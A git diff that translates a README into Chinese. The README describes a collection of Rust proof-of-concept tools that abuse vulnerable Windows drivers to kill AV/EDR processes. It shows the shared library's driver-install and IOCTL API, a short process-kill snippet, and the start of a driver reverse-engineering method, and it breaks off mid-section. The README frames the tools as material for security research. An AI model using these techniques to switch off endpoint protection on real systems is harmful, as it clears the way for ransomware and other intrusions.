@@ -1,122 +1,118 @@
-
-
-
 <img width="956" height="538" alt="cropped-Aug 28, 2025, 03_39_19 PM" src="https://github.com/user-attachments/assets/3d4b6944-770c-47c8-883b-f4d9bb90eb4d" />
 
 
+**BYOVD** 是一系列概念验证（PoC）的集合，演示如何利用存在漏洞的驱动程序来禁用 AV/EDR 解决方案。
 
-**BYOVD** is a collection of PoCs demonstrating how vulnerable drivers can be exploited to disable AV/EDR solutions.
-
-The collection includes both undocumented drivers and those with existing coverage in [LOLDDrivers](https://www.loldrivers.io/) or [Microsoft's recommended driver block rules](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/microsoft-recommended-driver-block-rules).
+该集合既包含未公开记录的驱动程序，也包含已在 [LOLDDrivers](https://www.loldrivers.io/) 或 [微软推荐的驱动程序阻止规则](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/microsoft-recommended-driver-block-rules) 中已有覆盖的驱动程序。
 
 ---
-> Since its initial discovery, the TfSysMon driver has been added to LOLDrivers and abused by ransomware groups using the **EDRKillShifter** tool, as reported by [Sophos](https://news.sophos.com/en-us/2024/08/14/edr-kill-shifter/) & [ESET](https://www.welivesecurity.com/en/eset-research/shifting-sands-ransomhub-edrkillshifter/)
+> 自首次发现以来，TfSysMon 驱动程序已被添加到 LOLDrivers，并被勒索软件团伙通过 **EDRKillShifter** 工具滥用，据 [Sophos](https://news.sophos.com/en-us/2024/08/14/edr-kill-shifter/) 和 [ESET](https://www.welivesecurity.com/en/eset-research/shifting-sands-ransomhub-edrkillshifter/) 报道
 ---
 
-## 📚 Table of Contents
-- [🔍 Overview](#-overview)
-- [🏗️ Project Structure](#%EF%B8%8F-project-structure)
-- [🔧 Building](#-building)
+## 📚 目录
+- [🔍 概述](#-概述)
+- [🏗️ 项目结构](#%EF%B8%8F-项目结构)
+- [🔧 构建](#-构建)
 - [📦 byovd-lib](#-byovd-lib)
-- [💡 POCs](#-pocs)
-- [🔬 Complete Driver Reverse Engineering Process (x64)](#-complete-driver-reverse-engineering-process-x64)
-- [🔗 References](#-references)
-- [⚠️ Disclaimer](#%EF%B8%8F-disclaimer)
+- [💡 POC](#-poc)
+- [🔬 完整的驱动程序逆向工程流程（x64）](#-完整的驱动程序逆向工程流程x64)
+- [🔗 参考资料](#-参考资料)
+- [⚠️ 免责声明](#%EF%B8%8F-免责声明)
   
-## 🔍 Overview
-The **BYOVD technique** has recently gained popularity in offensive security, particularly with the release of tools such as SpyBoy's *Terminator* (sold for $3,000) and the *ZeroMemoryEx Blackout* project. These tools capitalize on vulnerable drivers to disable AV/EDR agents, facilitating further attacks by reducing detection.
+## 🔍 概述
+**BYOVD 技术**最近在攻击性安全领域变得流行，尤其是随着 SpyBoy 的 *Terminator*（售价 3,000 美元）和 *ZeroMemoryEx Blackout* 项目等工具的发布。这些工具利用存在漏洞的驱动程序来禁用 AV/EDR 代理，通过降低检测能力来促进后续攻击。
 
-This repository contains several PoCs developed for educational purposes, helping researchers understand how these drivers can be abused to terminate processes.
+本仓库包含若干为教育目的开发的 PoC，帮助研究人员理解这些驱动程序如何被滥用来终止进程。
 
-## 🏗️ Project Structure
+## 🏗️ 项目结构
 
-The project is organized as a **Rust Cargo workspace**. Most PoCs share a common library (`byovd-lib`) that handles the boilerplate: driver service lifecycle, IOCTL dispatch, process monitoring, privilege adjustment, and cleanup. Each killer is a thin binary (~50-100 lines) that only defines its driver-specific configuration. **`K7Terminator`, `Astra64-Killer`, `Ktapi-Killer`, and `Xhunter1-Killer` are standalone** — they have their own `[workspace]` declarations and are built directly from their own directories, not via the root workspace.
+该项目组织为一个 **Rust Cargo 工作区**。大多数 PoC 共享一个公共库（`byovd-lib`），该库处理样板代码：驱动程序服务生命周期、IOCTL 分发、进程监控、权限调整和清理。每个 killer 都是一个轻量级二进制文件（约 50-100 行），仅定义其驱动程序特定的配置。**`K7Terminator`、`Astra64-Killer`、`Ktapi-Killer` 和 `Xhunter1-Killer` 是独立项目**——它们有自己的 `[workspace]` 声明，直接从各自目录构建，而非通过根工作区。
 
 ```
 BYOVD/
-├── Cargo.toml                       # Workspace root (deps + release profile)
+├── Cargo.toml                       # 工作区根（依赖 + release 配置）
 ├── Cargo.lock
 ├── README.md
 ├── LICENSE
 │
-├── byovd-lib/                       # Shared library
+├── byovd-lib/                       # 共享库
 │   ├── Cargo.toml
 │   └── src/
 │       ├── lib.rs                   # DriverConfig trait + run() / send_ioctl() / run_monitor()
-│       ├── service.rs               # ByovdDriver -- SCM lifecycle (install/start/stop_and_delete)
-│       ├── device.rs                # DeviceHandle -- 5 typed IOCTL dispatch shapes
-│       ├── handle.rs                # WinHandle / ScHandle -- RAII handle wrappers (Send + Sync)
+│       ├── service.rs               # ByovdDriver -- SCM 生命周期（install/start/stop_and_delete）
+│       ├── device.rs                # DeviceHandle -- 5 种类型化 IOCTL 分发形态
+│       ├── handle.rs                # WinHandle / ScHandle -- RAII 句柄包装器（Send + Sync）
 │       ├── process.rs               # find_pid_by_name / find_all_pids_by_name
-│       ├── monitor.rs               # run_monitor_loop (closure-based) + setup_ctrlc_handler
+│       ├── monitor.rs               # run_monitor_loop（基于闭包）+ setup_ctrlc_handler
 │       ├── privilege.rs             # enable_privilege / ensure_running_as_local_system
 │       └── util.rs                  # to_wstring / to_cstring / get_current_dir
 │
 ├── AppRemover-Killer/               # OPSWAT AppRemover ardrv.sys
-├── Astra64-Killer/                   # EnTech Astra32 / TVicHW astra64.sys -- standalone, data-only Shadow SSDT hijack EDR killer
-├── BdApiUtil-Killer/                # Baidu BdApiUtil64 (CVE-2024-51324)
+├── Astra64-Killer/                   # EnTech Astra32 / TVicHW astra64.sys -- 独立项目，仅数据 Shadow SSDT 劫持 EDR killer
+├── BdApiUtil-Killer/                # 百度 BdApiUtil64（CVE-2024-51324）
 ├── CcProtect-Killer/                # CnCrypt CcProtect
 ├── EnPortv-Killer/                  # EnCase EnPortv
-├── GameDriverX64-Killer/            # Fedeen GameDriverX64 (CVE-2025-61155)
+├── GameDriverX64-Killer/            # Fedeen GameDriverX64（CVE-2025-61155）
 ├── GoFlyDrv-Killer/                 # Golink GoFlyDrv
-├── HNOs2Ec-Killer/                  # HONOR PCManager HNOs2Ec.sys
-├── HWAudioOs2Ec-Killer/             # Huawei Audio driver HWAudioOs2Ec.sys
-├── K7Terminator/                    # K7 RKScan -- standalone, LPE + BYOVD modes
-├── Ksapi64-Killer/                  # Kingsoft ksapi64
-├── Ktapi-Killer/                    # Kontron ktapi.sys -- standalone, two-stage shellcode EDR killer
-├── MonProcess-Killer/               # HONOR HnRSMService MonProcess.sys
-├── MonProcessEX-Killer/             # HONOR MagicAnimation and HONOR PCManager MonProcessEX.sys
-├── NSec-Killer/                     # NSEC NSecKrnl (ValleyRAT BYOVD reproduction)
-├── PCTcore64-Killer/                # PC Tools PCTcore64 (CVE-2026-8501)
-├── PoisonX-Killer/                  # Microsoft PoisonX (j3h4ck reproduction)
-├── STProcessMonitor-Killer/         # Safetica STProcessMonitor (CVE-2025-70795, v114 + v2618)
+├── HNOs2Ec-Killer/                  # 荣耀 PCManager HNOs2Ec.sys
+├── HWAudioOs2Ec-Killer/             # 华为音频驱动 HWAudioOs2Ec.sys
+├── K7Terminator/                    # K7 RKScan -- 独立项目，LPE + BYOVD 模式
+├── Ksapi64-Killer/                  # 金山 ksapi64
+├── Ktapi-Killer/                    # Kontron ktapi.sys -- 独立项目，两阶段 shellcode EDR killer
+├── MonProcess-Killer/               # 荣耀 HnRSMService MonProcess.sys
+├── MonProcessEX-Killer/             # 荣耀 MagicAnimation 和荣耀 PCManager MonProcessEX.sys
+├── NSec-Killer/                     # NSEC NSecKrnl（ValleyRAT BYOVD 复现）
+├── PCTcore64-Killer/                # PC Tools PCTcore64（CVE-2026-8501）
+├── PoisonX-Killer/                  # 微软 PoisonX（j3h4ck 复现）
+├── STProcessMonitor-Killer/         # Safetica STProcessMonitor（CVE-2025-70795，v114 + v2618）
 ├── TfSysMon-Killer/                 # ThreatFire sysmon
-├── UnknownKiller/                   # unattributed unknown.sys
+├── UnknownKiller/                   # 未归属的 unknown.sys
 ├── Viragt64-Killer/                 # Tg Soft viragt64
-├── Wsftprm-Killer/                  # Topaz wsftprm (CVE-2023-52271)
-├── Xhunter1-Killer/                 # Wellbia xhunter1.sys (CVE-2026-3609)
+├── Wsftprm-Killer/                  # Topaz wsftprm（CVE-2023-52271）
+├── Xhunter1-Killer/                 # Wellbia xhunter1.sys（CVE-2026-3609）
 └── Xkpsm-Killer/                    # JiranJikyosoft X-Keeper xkpsm
 ```
 
-Each `*-Killer/` directory contains its own `Cargo.toml`, `src/main.rs` (the `DriverConfig` impl + CLI), `README.md` (driver hashes + usage), and the matching `.sys` file the binary loads at runtime.
+每个 `*-Killer/` 目录都包含自己的 `Cargo.toml`、`src/main.rs`（`DriverConfig` 实现 + CLI）、`README.md`（驱动程序哈希 + 用法）以及二进制文件在运行时加载的匹配 `.sys` 文件。
 
-## 🔧 Building
+## 🔧 构建
 
-**Prerequisites:** Rust toolchain and Visual Studio Build Tools with the Windows SDK.
+**前置条件：** Rust 工具链和带有 Windows SDK 的 Visual Studio Build Tools。
 
 ```bash
-# Build all tools (release, optimized + stripped)
+# 构建所有工具（release，优化 + 剥离）
 cargo build --release
 
-# Build a single tool
+# 构建单个工具
 cargo build --release -p BdApiUtil-Killer
 
-# Build multiple specific tools
+# 构建多个特定工具
 cargo build --release -p NSec-Killer -p Wsftprm-Killer
 ```
 
-Binaries are output to `target/release/`. Copy the corresponding `.sys` driver file into the same directory as the executable before running.
+二进制文件输出到 `target/release/`。运行前请将对应的 `.sys` 驱动程序文件复制到与可执行文件相同的目录中。
 
 ## 📦 byovd-lib
 
-`byovd-lib` is the shared library that all PoCs (except K7Terminator) are built on. It exposes **two complementary APIs** -- a high-level declarative one for the standard "install driver, kill on sight, clean up" flow, and a low-level imperative one for killers that need a custom flow (attach to an already-loaded driver, fan out to multiple PIDs, structured IOCTL buffers, custom retry logic, etc.). Both can be mixed in the same binary.
+`byovd-lib` 是所有 PoC（除 K7Terminator 外）所基于的共享库。它公开了 **两个互补的 API**——一个用于标准"安装驱动、发现即杀、清理"流程的高级声明式 API，以及一个用于需要自定义流程的 killer（附加到已加载的驱动、向多个 PID 分发、结构化 IOCTL 缓冲区、自定义重试逻辑等）的低级命令式 API。两者可以在同一二进制文件中混合使用。
 
-### Module layout
+### 模块布局
 
 ```
 byovd-lib/src/
 ├── lib.rs        # DriverConfig trait + run() / send_ioctl() / run_monitor()
-├── service.rs    # ByovdDriver -- SCM lifecycle (install, start, stop_and_delete)
-├── device.rs     # DeviceHandle -- typed IOCTL dispatch (5 shapes)
-├── handle.rs     # WinHandle / ScHandle -- RAII handle wrappers (Send + Sync)
+├── service.rs    # ByovdDriver -- SCM 生命周期（install, start, stop_and_delete）
+├── device.rs     # DeviceHandle -- 类型化 IOCTL 分发（5 种形态）
+├── handle.rs     # WinHandle / ScHandle -- RAII 句柄包装器（Send + Sync）
 ├── process.rs    # find_pid_by_name / find_all_pids_by_name
-├── monitor.rs    # run_monitor_loop (closure-based) + setup_ctrlc_handler
+├── monitor.rs    # run_monitor_loop（基于闭包）+ setup_ctrlc_handler
 ├── privilege.rs  # enable_privilege / ensure_running_as_local_system
 └── util.rs       # to_wstring / to_cstring / get_current_dir
 ```
 
-### High-level API: `DriverConfig` trait + `run()`
+### 高级 API：`DriverConfig` trait + `run()`
 
-This is what the bundled killers use. Implement the trait, call `byovd_lib::run()`, done.
+这是捆绑的 killer 所使用的。实现该 trait，调用 `byovd_lib::run()`，完成。
 
 ```rust
 use byovd_lib::{DriverConfig, Result};
@@ -145,57 +141,57 @@ fn main() -> Result<()> {
 }
 ```
 
-`run()` does: `preflight_check` → install service (`SERVICE_DEMAND_START`) → `StartService` → kill-on-sight monitor (Ctrl+C to exit) → stop + delete service.
+`run()` 执行：`preflight_check` → 安装服务（`SERVICE_DEMAND_START`）→ `StartService` → 发现即杀监控（Ctrl+C 退出）→ 停止并删除服务。
 
-Optional trait overrides with their defaults:
+可选 trait 覆盖及其默认值：
 
-| Method | Default | Purpose |
+| 方法 | 默认值 | 用途 |
 |---|---|---|
-| `device_access()` | `SERVICE_ALL_ACCESS` | `CreateFileW` access flags |
-| `skip_unload()` | `false` | Skip driver cleanup (e.g. drivers that BSOD on unload) |
-| `ignore_ioctl_error()` | `false` | Treat IOCTL failure as success (e.g. NSecKrnl reports error on success) |
-| `ioctl_output_size()` | `0` | Expected output buffer size in bytes |
-| `preflight_check()` | `Ok(())` | Pre-launch validation (e.g. LocalSystem check) |
+| `device_access()` | `SERVICE_ALL_ACCESS` | `CreateFileW` 访问标志 |
+| `skip_unload()` | `false` | 跳过驱动程序清理（例如卸载时蓝屏的驱动程序） |
+| `ignore_ioctl_error()` | `false` | 将 IOCTL 失败视为成功（例如 NSecKrnl 在成功时报告错误） |
+| `ioctl_output_size()` | `0` | 预期输出缓冲区大小（字节） |
+| `preflight_check()` | `Ok(())` | 启动前验证（例如 LocalSystem 检查） |
 
-### Low-level API: imperative pieces
+### 低级 API：命令式组件
 
-When the trait flow doesn't fit -- e.g. the driver is already loaded and you only want to fire one IOCTL, you need a custom retry policy, the IOCTL takes a structured input rather than just a PID, or you want to fan out across all matching PIDs -- compose the lower-level pieces directly.
+当 trait 流程不适合时——例如驱动程序已加载，你只想发送一个 IOCTL；你需要自定义重试策略；IOCTL 接受结构化输入而不仅仅是 PID；或者你想向所有匹配的 PID 分发——可以直接组合使用底层组件。
 
-**Driver lifecycle** -- `ByovdDriver`:
+**驱动程序生命周期** -- `ByovdDriver`：
 
 ```rust
 use byovd_lib::ByovdDriver;
 
 let driver = ByovdDriver::new("MyDriver", "mydriver.sys", "\\\\.\\MyDevice")?;
-driver.start()?;                       // ERROR_SERVICE_ALREADY_RUNNING is OK
-let device = driver.open_device()?;    // returns DeviceHandle
-// ... send IOCTLs ...
+driver.start()?;                       // ERROR_SERVICE_ALREADY_RUNNING 是可以的
+let device = driver.open_device()?;    // 返回 DeviceHandle
+// ... 发送 IOCTL ...
 driver.stop_and_delete()?;
 ```
 
-**IOCTL dispatch** -- `DeviceHandle` exposes five typed shapes:
+**IOCTL 分发** -- `DeviceHandle` 公开五种类型化形态：
 
-| Method | Use when |
+| 方法 | 使用场景 |
 |---|---|
-| `ioctl<I, O>(code, &input, &mut output)` | Both input and output buffers, separate types |
-| `ioctl_inout<T>(code, &mut data)` | Same buffer for input + output |
-| `ioctl_in<I>(code, &input)` | Input only, no output buffer |
-| `ioctl_in_unchecked<I>(code, &input)` | Input only, ignore failure (per-call alternative to `ignore_ioctl_error`) |
-| `ioctl_raw(code, in_ptr, in_size, out_ptr, out_size)` | Raw pointer escape hatch |
+| `ioctl<I, O>(code, &input, &mut output)` | 同时有输入和输出缓冲区，类型不同 |
+| `ioctl_inout<T>(code, &mut data)` | 输入和输出使用同一缓冲区 |
+| `ioctl_in<I>(code, &input)` | 仅输入，无输出缓冲区 |
+| `ioctl_in_unchecked<I>(code, &input)` | 仅输入，忽略失败（`ignore_ioctl_error` 的按调用替代方案） |
+| `ioctl_raw(code, in_ptr, in_size, out_ptr, out_size)` | 原始指针逃生通道 |
 
-The typed forms remove the manual `to_ne_bytes()` / `extend_from_slice()` boilerplate when the IOCTL takes a struct (e.g. `{ pid: u32, padding: [u8; 20] }`).
+当 IOCTL 接受结构体时（例如 `{ pid: u32, padding: [u8; 20] }`），类型化形式消除了手动 `to_ne_bytes()` / `extend_from_slice()` 样板代码。
 
-**Process lookup** -- `find_pid_by_name(name)` (first match) and `find_all_pids_by_name(name)` (all matches, excludes system PIDs ≤ 4).
+**进程查找** -- `find_pid_by_name(name)`（首个匹配）和 `find_all_pids_by_name(name)`（所有匹配，排除系统 PID ≤ 4）。
 
-**Custom monitor loop** -- `run_monitor_loop(name, interval, |pid| ...)` takes a closure so you can do whatever you want per match (multiple IOCTLs, structured logging, fan-out across PIDs, retry on error).
+**自定义监控循环** -- `run_monitor_loop(name, interval, |pid| ...)` 接受一个闭包，因此你可以对每个匹配做任何事（多个 IOCTL、结构化日志、跨 PID 分发、出错重试）。
 
-**Privileges** -- `enable_privilege("SeDebugPrivilege")` / `enable_privilege("SeLoadDriverPrivilege")` for drivers that require explicit token privileges. `ensure_running_as_local_system()` returns an error if the process is not running as `S-1-5-18`.
+**权限** -- `enable_privilege("SeDebugPrivilege")` / `enable_privilege("SeLoadDriverPrivilege")` 用于需要显式令牌权限的驱动程序。`ensure_running_as_local_system()` 如果进程不是以 `S-1-5-18` 运行则返回错误。
 
-**Handle wrappers** -- `WinHandle` (auto-`CloseHandle`) and `ScHandle` (auto-`CloseServiceHandle`) are `Send + Sync` and can be moved across threads.
+**句柄包装器** -- `WinHandle`（自动 `CloseHandle`）和 `ScHandle`（自动 `CloseServiceHandle`）是 `Send + Sync` 的，可以跨线程移动。
 
-### Example: attach to an already-loaded driver, no service lifecycle
+### 示例：附加到已加载的驱动程序，无服务生命周期
 
-This is what `UnknownKiller --attach` does -- skip SCM entirely, just open the device and fire the IOCTL once:
+这就是 `UnknownKiller --attach` 所做的——完全跳过 SCM，仅打开设备并发送一次 IOCTL：
 
 ```rust
 use byovd_lib::{find_pid_by_name, DeviceHandle, Result};
@@ -203,72 +199,70 @@ use byovd_lib::{find_pid_by_name, DeviceHandle, Result};
 fn main() -> Result<()> {
     let device = DeviceHandle::open("\\\\.\\eb")?;
     let pid = find_pid_by_name("notepad.exe").ok_or("not running")?;
-    device.ioctl_in(0x222024, &pid)?;   // typed: just pass &u32
+    device.ioctl_in(0x222024, &pid)?;   // 类型化：直接传 &u32
     Ok(())
 }
 ```
 
-### Back-compat aliases
+### 向后兼容别名
 
-`FileHandle` / `ServiceHandle` still resolve to `WinHandle` / `ScHandle`, and `get_pid_by_name` is kept as an alias for `find_pid_by_name`, so older code referencing those names keeps compiling.
+`FileHandle` / `ServiceHandle` 仍然解析为 `WinHandle` / `ScHandle`，`get_pid_by_name` 保留为 `find_pid_by_name` 的别名，因此引用这些旧名称的代码仍可编译。
 
-## 💡 POCs
-Below are the drivers and their respective PoCs available in this repository:
+## 💡 POC
+以下是本仓库中可用的驱动程序及其各自的 PoC：
 
-- **[AppRemover-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/AppRemover-Killer)**: Targets `ardrv.sys` from `OPSWAT AppRemover`.
-- **[Astra64-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/Astra64-Killer)**: Targets `astra64.sys` from `EnTech Taiwan` (Astra32 / TVicHW) -- standalone data-only Shadow SSDT hijack EDR killer.
-- **[BdApiUtil-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/BdApiUtil-Killer)**: Targets `BdApiUtil64.sys` from `Baidu AntiVirus` (CVE-2024-51324).
-- **[CcProtect-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/CcProtect-Killer)**: Targets `CcProtect.sys` from `CnCrypt`.
-- **[EnPortv-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/EnPortv-Killer)**: Targets `EnPortv.sys` from `Guidance EnCase`.
-- **[GameDriverX64-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/GameDriverX64-Killer)**: Targets `GameDriverX64.sys` from `Fedeen Games` (CVE-2025-61155).
-- **[GoFlyDrv-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/GoFlyDrv-Killer)**: Targets `GoFlyDrv.sys` from `Golink`.
-- **[HNOs2Ec-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/HNOs2Ec-Killer)**: Targets `HNOs2Ec.sys` from `HONOR` (PCManager).
-- **[HWAudioOs2Ec-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/HWAudioOs2Ec-Killer)**: Targets `HWAudioOs2Ec.sys` from `Huawei`.
-- **[K7Terminator](https://github.com/BlackSnufkin/BYOVD/tree/main/K7Terminator)**: Targets `K7RKScan.sys` from `K7 Computing` (CVE-2025-52915, CVE-2025-1055) -- [Full write-up](https://blacksnufkin.github.io/posts/BYOVD-CVE-2025-52915/).
-- **[Ksapi64-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/Ksapi64-Killer)**: Targets `ksapi64.sys` / `ksapi64_del.sys` from `Kingsoft Corporation`.
-- **[Ktapi-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/Ktapi-Killer)**: Targets `ktapi.sys` from `Kontron` -- standalone two-stage shellcode EDR killer.
-- **[MonProcess-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/MonProcess-Killer)**: Targets `MonProcess.sys` from `HONOR` (HnRSMService).
-- **[MonProcessEX-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/MonProcessEX-Killer)**: Targets `MonProcessEX.sys` from `HONOR`.
-- **[NSec-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/NSec-Killer)**: Targets `NSecKrnl.sys` from `NSEC` (ValleyRAT BYOVD reproduction).
-- **[PCTcore64-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/PCTcore64-Killer)**: Targets `PCTcore64.sys` from `PC Tools` (CVE-2026-8501).
-- **[PoisonX-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/PoisonX-Killer)**: Target `PoisonX.sys` from `Microsoft` ([@j3h4ck](https://github.com/j3h4ck/PoisonKiller/) reproduction)
-- **[STProcessMonitor-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/STProcessMonitor-Killer)**: Targets `STProcessMonitor.sys` from `Safetica` (CVE-2025-70795, supports v11.11.4 and v11.26.18).
-- **[TfSysMon-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/TfSysMon-Killer)**: Targets `sysmon.sys` from `ThreatFire System Monitor`.
-- **[UnknownKiller](https://github.com/BlackSnufkin/BYOVD/tree/main/UnknownKiller)**: Targets `unknown.sys` from an unattributed vendor (driver origin TBD).
-- **[Viragt64-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/Viragt64-Killer)**: Targets `viragt64.sys` from `Tg Soft`.
-- **[Wsftprm-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/Wsftprm-Killer)**: Targets `wsftprm.sys` from `Topaz Antifraud` (CVE-2023-52271).
-- **[Xhunter1-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/Xhunter1-Killer)**: Targets legacy `xhunter1.sys` from `Wellbia` (XIGNCODE3, CVE-2026-3609).
-- **[Xkpsm-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/Xkpsm-Killer)**: Targets `xkpsm.sys` from `JiranJikyosoft X-Keeper`.
+- **[AppRemover-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/AppRemover-Killer)**：针对 `OPSWAT AppRemover` 的 `ardrv.sys`。
+- **[Astra64-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/Astra64-Killer)**：针对 `EnTech Taiwan`（Astra32 / TVicHW）的 `astra64.sys`——独立项目，仅数据 Shadow SSDT 劫持 EDR killer。
+- **[BdApiUtil-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/BdApiUtil-Killer)**：针对 `百度杀毒` 的 `BdApiUtil64.sys`（CVE-2024-51324）。
+- **[CcProtect-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/CcProtect-Killer)**：针对 `CnCrypt` 的 `CcProtect.sys`。
+- **[EnPortv-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/EnPortv-Killer)**：针对 `Guidance EnCase` 的 `EnPortv.sys`。
+- **[GameDriverX64-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/GameDriverX64-Killer)**：针对 `Fedeen Games` 的 `GameDriverX64.sys`（CVE-2025-61155）。
+- **[GoFlyDrv-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/GoFlyDrv-Killer)**：针对 `Golink` 的 `GoFlyDrv.sys`。
+- **[HNOs2Ec-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/HNOs2Ec-Killer)**：针对 `荣耀`（PCManager）的 `HNOs2Ec.sys`。
+- **[HWAudioOs2Ec-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/HWAudioOs2Ec-Killer)**：针对 `华为` 的 `HWAudioOs2Ec.sys`。
+- **[K7Terminator](https://github.com/BlackSnufkin/BYOVD/tree/main/K7Terminator)**：针对 `K7 Computing` 的 `K7RKScan.sys`（CVE-2025-52915，CVE-2025-1055）——[完整文章](https://blacksnufkin.github.io/posts/BYOVD-CVE-2025-52915/)。
+- **[Ksapi64-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/Ksapi64-Killer)**：针对 `金山公司` 的 `ksapi64.sys` / `ksapi64_del.sys`。
+- **[Ktapi-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/Ktapi-Killer)**：针对 `Kontron` 的 `ktapi.sys`——独立项目，两阶段 shellcode EDR killer。
+- **[MonProcess-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/MonProcess-Killer)**：针对 `荣耀`（HnRSMService）的 `MonProcess.sys`。
+- **[MonProcessEX-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/MonProcessEX-Killer)**：针对 `荣耀` 的 `MonProcessEX.sys`。
+- **[NSec-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/NSec-Killer)**：针对 `NSEC` 的 `NSecKrnl.sys`（ValleyRAT BYOVD 复现）。
+- **[PCTcore64-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/PCTcore64-Killer)**：针对 `PC Tools` 的 `PCTcore64.sys`（CVE-2026-8501）。
+- **[PoisonX-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/PoisonX-Killer)**：针对 `微软` 的 `PoisonX.sys`（[@j3h4ck](https://github.com/j3h4ck/PoisonKiller/) 复现）
+- **[STProcessMonitor-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/STProcessMonitor-Killer)**：针对 `Safetica` 的 `STProcessMonitor.sys`（CVE-2025-70795，支持 v11.11.4 和 v11.26.18）。
+- **[TfSysMon-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/TfSysMon-Killer)**：针对 `ThreatFire System Monitor` 的 `sysmon.sys`。
+- **[UnknownKiller](https://github.com/BlackSnufkin/BYOVD/tree/main/UnknownKiller)**：针对未归属厂商的 `unknown.sys`（驱动程序来源待定）。
+- **[Viragt64-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/Viragt64-Killer)**：针对 `Tg Soft` 的 `viragt64.sys`。
+- **[Wsftprm-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/Wsftprm-Killer)**：针对 `Topaz Antifraud` 的 `wsftprm.sys`（CVE-2023-52271）。
+- **[Xhunter1-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/Xhunter1-Killer)**：针对 `Wellbia`（XIGNCODE3，CVE-2026-3609）的旧版 `xhunter1.sys`。
+- **[Xkpsm-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/Xkpsm-Killer)**：针对 `JiranJikyosoft X-Keeper` 的 `xkpsm.sys`。
 
-## 🔬 Complete Driver Reverse Engineering Process (x64)
+## 🔬 完整的驱动程序逆向工程流程（x64）
 
-This section demonstrates the complete A-Z reverse engineering methodology using the TfSysMon driver as a practical example. This process applies to any x64 Windows kernel driver analysis.
+本节以 TfSysMon 驱动程序为实际示例，演示完整的 A-Z 逆向工程方法论。该流程适用于任何 x64 Windows 内核驱动程序分析。
 
-## 🎯 Step 0: Pre-Analysis - Function Import Screening
+## 🎯 步骤 0：预分析 - 函数导入筛查
 
-Check driver imports before starting reverse engineering.
+在开始逆向工程之前检查驱动程序导入。
 
-A basic process killer driver requires 2 things:
+一个基本的进程 killer 驱动程序需要两样东西：
 
-a way to get a handle on a process (for instance **ZwOpenProcess** or **NtOpenProcess**)
+获取进程句柄的方法（例如 **ZwOpenProcess** 或 **NtOpenProcess**）
 
-a way to terminate the process (for instance  **ZwTerminateProcess** or **NtTerminateProcess**)
+终止进程的方法（例如 **ZwTerminateProcess** 或 **NtTerminateProcess**）
 
-Check if a driver imports both function types. If a driver has in its imported functions Nt/ZwOpenProcess AND Nt/ZwTerminateProcess then it's a potential process killer driver candidate.
+检查驱动程序是否同时导入这两种函数类型。如果驱动程序的导入函数中有 Nt/ZwOpenProcess 和 Nt/ZwTerminateProcess，那么它就是一个潜在的进程 killer 驱动程序候选。只有在确认这些导入之后，才应继续在 IDA Pro 中进行详细逆向工程。
 
-Only after confirming these imports should you proceed to detailed reverse engineering in IDA Pro.
+### 🛠️ x64 驱动程序分析前置条件
 
-### 🛠️ Prerequisites for x64 Driver Analysis
+**必需工具：**
+- **IDA Pro** - 用于反汇编驱动程序进行静态分析
+- **OSRLoader** - 用于加载/运行驱动程序（sc.exe 命令的替代方案）
 
-**Required Tools:**
-- **IDA Pro** - for disassembling the driver for static analysis
-- **OSRLoader** - for loading/running the driver (alternative to sc.exe command)
+### 📍 步骤 1：定位并分析 DriverEntry
 
-### 📍 Step 1: Locate and Analyze DriverEntry
+**每个 Windows 驱动程序都从 DriverEntry 开始——首先找到这个函数：**
 
-**Every Windows driver starts with DriverEntry - find this function first:**
-
-In TfSysMon, the DriverEntry looks like this:
+在 TfSysMon 中，DriverEntry 如下所示：
 
 ```c
 NTSTATUS __stdcall DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
@@ -287,19 +281,19 @@ NTSTATUS __stdcall DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING Regi
 }
 ```
 
-**Analysis Notes:**
-- The code performs some initialization with BugCheckParameter2 and BugCheckParameter3
-- The real driver initialization happens in `sub_17484`
-- Follow the call to `sub_17484(DriverObject)` - this is where actual driver setup occurs
+**分析说明：**
